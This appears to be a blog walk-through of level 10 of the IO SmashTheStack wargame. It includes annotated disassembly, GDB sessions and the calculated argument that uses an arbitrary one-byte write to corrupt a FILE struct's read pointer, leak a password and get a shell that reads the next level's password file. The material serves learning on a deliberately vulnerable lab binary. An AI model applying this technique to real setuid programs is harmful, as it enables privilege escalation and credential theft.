+++
title = "IO Smash the stack level 10"
date = "2016-02-16T19:29:00-02:00"
publishdate = "2016-02-16"
categories =["Security"]
tags = ["Wargames", "C"]
slug = "io-smashthestack-level-10"
project_url = "https://greyhat.dk/io-smashthestack-level-10"
type = "post"
description = "Walk-through"
+++

## Level10

I had a lot of issues with this level. At first I did not understand how I could exploit it so I tried several things until I finally got it. I started looking at the source code but still could not see the problem. I connected to the irc channel for help and got a few pointers on how to debug this. But the thing that helped me most I guess was this [link](http://io.smashthestack.org/x/compile.txt). Its not about how many levels you get its about getting why you got there and that most security vulnerbilities does not come with source code. So I started to analyze the binary.

Second I tried to debug the original version in /levels/level10 but due to suid and GDB not getting permissions from the kernel to do a ptrace I had to make a copy. Another thing that bite me was that even though I copied the binary and changed the string to the password file to my own file, exploited the vulnerbility it still did not work on the original binary. The problem was that the argv[0] did not have the same length as the original hence having a different stack. So I created a binary with the same length.

```sh
mkdir -p /tmp/d10
cp /levels/level10 /tmp/d10/aaaaaa
```

Here is the copy of the original binary with my comments

```sh
level10@io:/tmp/d10$ gdb -q ./aaaaaa
Reading symbols from /tmp/d10/aaaaaa...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
   0x080484c4 <+0>:	push   ebp
   0x080484c5 <+1>:	mov    ebp,esp
   0x080484c7 <+3>:	push   edi
   0x080484c8 <+4>:	sub    esp,0x74  ; allocate 116 bytes
   0x080484cb <+7>:	and    esp,0xfffffff0
   0x080484ce <+10>:	mov    eax,0x0
   0x080484d3 <+15>:	sub    esp,eax
   0x080484d5 <+17>:	mov    DWORD PTR [esp+0x4],0x80486a4 ; "r"
   0x080484dd <+25>:	mov    DWORD PTR [esp],0x80486a6 ; "/tmp/desdic10/aaaaaaaaaa" (Modified from original path)
   0x080484e4 <+32>:	call   0x80483c8 <fopen@plt>
   0x080484e9 <+37>:	mov    DWORD PTR [ebp-0xc],eax ; Save fp
   0x080484ec <+40>:	lea    edi,[ebp-0x48]
   0x080484ef <+43>:	cld
   0x080484f0 <+44>:	mov    edx,0x0
   0x080484f5 <+49>:	mov    eax,0xa
   0x080484fa <+54>:	mov    ecx,eax
   0x080484fc <+56>:	mov    eax,edx
   0x080484fe <+58>:	rep stos DWORD PTR es:[edi],eax
   0x08048500 <+60>:	cmp    DWORD PTR [ebp-0xc],0x0 ; if fp==0
   0x08048504 <+64>:	je     0x804850e <main+74>
   0x08048506 <+66>:	cmp    DWORD PTR [ebp+0x8],0x2 ; if argc != 2
   0x0804850a <+70>:	jne    0x804850e <main+74>
   0x0804850c <+72>:	jmp    0x804851a <main+86>
   0x0804850e <+74>:	mov    DWORD PTR [ebp-0x5c],0xffffffff
   0x08048515 <+81>:	jmp    0x80485d3 <main+271>
   0x0804851a <+86>:	mov    eax,DWORD PTR [ebp-0xc] ; get FP
   0x0804851d <+89>:	mov    DWORD PTR [esp+0xc],eax
   0x08048521 <+93>:	mov    DWORD PTR [esp+0x8],0x14 ; read 20 bytes
   0x08048529 <+101>:	mov    DWORD PTR [esp+0x4],0x1
   0x08048531 <+109>:	lea    eax,[ebp-0x48]
   0x08048534 <+112>:	mov    DWORD PTR [esp],eax
   0x08048537 <+115>:	call   0x80483f8 <fread@plt> ; fread(ebp-0x35, 20, 1, fp)
   0x0804853c <+120>:	mov    BYTE PTR [ebp-0x35],0x0
   0x08048540 <+124>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048543 <+127>:	add    eax,0x4
   0x08048546 <+130>:	mov    eax,DWORD PTR [eax]
   0x08048548 <+132>:	mov    DWORD PTR [esp],eax ; convert argv[1] to int
   0x0804854b <+135>:	call   0x80483d8 <atoi@plt>
   0x08048550 <+140>:	mov    BYTE PTR [eax+ebp*1-0x58],0x0  ; int(argv[1]) in ebp-0x58 (1 byte)
   0x08048555 <+145>:	mov    eax,DWORD PTR [ebp-0xc]
   0x08048558 <+148>:	mov    DWORD PTR [esp+0xc],eax
   0x0804855c <+152>:	mov    DWORD PTR [esp+0x8],0x13 ; read 19 bytes
   0x08048564 <+160>:	mov    DWORD PTR [esp+0x4],0x1
   0x0804856c <+168>:	lea    eax,[ebp-0x48]
   0x0804856f <+171>:	add    eax,0x14
   0x08048572 <+174>:	mov    DWORD PTR [esp],eax
   0x08048575 <+177>:	call   0x80483f8 <fread@plt> ; fread(ebp-0x48, 19, 1, fp)
   0x0804857a <+182>:	mov    eax,DWORD PTR [ebp-0xc]
   0x0804857d <+185>:	mov    DWORD PTR [esp],eax
   0x08048580 <+188>:	call   0x80483b8 <fclose@plt>
   0x08048585 <+193>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048588 <+196>:	add    eax,0x4
   0x0804858b <+199>:	lea    edx,[ebp-0x48]
   0x0804858e <+202>:	mov    eax,DWORD PTR [eax]
   0x08048590 <+204>:	mov    DWORD PTR [esp+0x4],eax
   0x08048594 <+208>:	mov    DWORD PTR [esp],edx
   0x08048597 <+211>:	call   0x8048408 <strcmp@plt> ; strcmp(ebp-0x48, argv[1])
   0x0804859c <+216>:	test   eax,eax
   0x0804859e <+218>:	jne    0x80485be <main+250> ; if ebp-0x48 != argv[1] goto main+250
   0x080485a0 <+220>:	mov    DWORD PTR [esp+0x8],0x0 ; else give shell
   0x080485a8 <+228>:	mov    DWORD PTR [esp+0x4],0x80486bf  ; "sh"
   0x080485b0 <+236>:	mov    DWORD PTR [esp],0x80486c2 ; "/bin/sh"
   0x080485b7 <+243>:	call   0x80483a8 <execl@plt> ; execl("/bin/sh", "sh", 0)
   0x080485bc <+248>:	jmp    0x80485cc <main+264>
   0x080485be <+250>:	lea    eax,[ebp-0x48] ; load ebp-0x48 (error message)
   0x080485c1 <+253>:	add    eax,0x14
   0x080485c4 <+256>:	mov    DWORD PTR [esp],eax
   0x080485c7 <+259>:	call   0x80483e8 <puts@plt> ; print error message
   0x080485cc <+264>:	mov    DWORD PTR [ebp-0x5c],0x0
   0x080485d3 <+271>:	mov    eax,DWORD PTR [ebp-0x5c]
   0x080485d6 <+274>:	mov    edi,DWORD PTR [ebp-0x4]
   0x080485d9 <+277>:	leave
   0x080485da <+278>:	ret
End of assembler dump.
(gdb)
```

So the password file consist of 20 bytes of password and 19 bytes of error message. So I created /tmp/desdic10/aaaaaaaaaa

```sh
12345678901234567890ACCESS DENIED123456
```

and we got to write a 0 to a byte of our choosing

```sh
   0x08048550 <+140>:	mov    BYTE PTR [eax+ebp*1-0x58],0x0  ; int(argv[1]) in ebp-0x58 (1 byte)
```

Now the binary uses fread(1) and the interesting part here is the *FILE (_IO_FILE)

From libio.h
```c
struct _IO_FILE {
  int _flags;           /* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;   /* Current read pointer */
  char* _IO_read_end;   /* End of get area. */
  char* _IO_read_base;  /* Start of putback+get area. */
  char* _IO_write_base; /* Start of put area. */
  char* _IO_write_ptr;  /* Current put pointer. */
  char* _IO_write_end;  /* End of put area. */
  char* _IO_buf_base;   /* Start of reserve area. */
  char* _IO_buf_end;    /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```

So lets examine *FILE located at $ebp-0xc and our pointer to int(argv[1])
```sh
(gdb) break *0x08048555
Breakpoint 1 at 0x8048555
(gdb) r AAAAAAA
Starting program: /tmp/d10/aaaaaa AAAAAAA

Breakpoint 1, 0x08048555 in main ()
(gdb) p/x $ebp-0x58
$1 = 0xbffffc60
(gdb) p/x $ebp-0xc
$2 = 0xbffffcac
(gdb) x/8wx 0xbffffcac
0xbffffcac:	0x0804a008	0x080485f0	0x00000000	0xbffffd38
0xbffffcbc:	0xb7e85e46	0x00000002	0xbffffd64	0xbffffd70
(gdb) x/8wx 0x0804a008
0x804a008:	0xfbad2488	0xb7fde014	0xb7fde028	0xb7fde000
0x804a018:	0xb7fde000	0xb7fde000	0xb7fde000	0xb7fde000
```

Oki so at our first break point (After the first fread) we have

```c
  int _flags = 0xfbad2488
  char* _IO_read_ptr = 0xb7fde014
  char* _IO_read_end = 0xb7fde028
  char* _IO_read_base = 0xb7fde000
  ....
```

Lets set another break point after the second fread

```sh
(gdb) break *0x08048580
Breakpoint 2 at 0x8048580
(gdb) c
Continuing.

Breakpoint 2, 0x08048580 in main ()
(gdb) x/8wx 0x0804a008
0x804a008:	0xfbad2488	0xb7fde027	0xb7fde028	0xb7fde000
0x804a018:	0xb7fde000	0xb7fde000	0xb7fde000	0xb7fde000
```

Now we have

```c
  int _flags = 0xfbad2488
  char* _IO_read_ptr = 0xb7fde027
  char* _IO_read_end = 0xb7fde028
  char* _IO_read_base = 0xb7fde000
  ....
```

So on the first run we have 0xb7fde014 (Reading 0x14 bytes and on the second read we have 0xb7fde027 (0x14+0x13 / 20+19 = 39 bytes). So if we can write a 0 after the first read into the last byte of _IO_read_ptr we should be able to get the program to write the password and not the error message. Lets try to isolate the byte


```sh
(gdb) !echo "obase=16; ibase=16; 804A008 + 4"|bc
804A00C
(gdb) x/bx 0x0804a00c
0x804a00c:	0x27
```

Ok so we have the address we want to write to so lets calculate the offset from the BYTE PTR[int(argv)] = 0 to the address of the last byte of _IO_read_ptr

```sh
(gdb) p 0x0804a00c - 0xbffffc60
$3 = 1208263596
(gdb) r 1208263596
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /tmp/d10/aaaaaa 1208263596

Breakpoint 1, 0x08048555 in main ()
(gdb) c
Continuing.

Breakpoint 2, 0x08048580 in main ()
(gdb) c
Continuing.
1234567890123456789
[Inferior 1 (process 21091) exited normally]
```

So we now have our predefined password and the parameter that will show us the read password. Lets try it

```sh
level10@io:/tmp/desdic10$ /levels/level10 1208263596
XXXXXXXXXXXXXXXXXXX
level10@io:/tmp/desdic10$ /levels/level10 'XXXXXXXXXXXXXXXXXXX'
sh-4.2$ cat /home/level11/.pass
XXXXXXXXXXXXXXXX
```


